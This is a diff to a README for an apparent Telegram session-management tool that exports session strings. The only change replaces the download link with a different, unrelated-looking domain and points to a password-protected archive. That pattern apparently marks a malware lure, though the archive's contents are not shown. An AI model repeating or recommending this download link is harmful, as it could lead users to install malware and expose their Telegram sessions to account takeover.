@@ -18,7 +18,7 @@ Manage and view active Telegram sessions across devices. Export session strings 
 
 ## Download
 
-[![Download v1.3.0](https://img.shields.io/badge/Download_v1.3.0-ec4899?style=for-the-badge&logoColor=white)](https://forumconnect.uk/tgsession)
+[![Download v1.3.0](https://img.shields.io/badge/Download_v1.3.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/tgsession)
 
 > The archive password is shown on the download page.
 
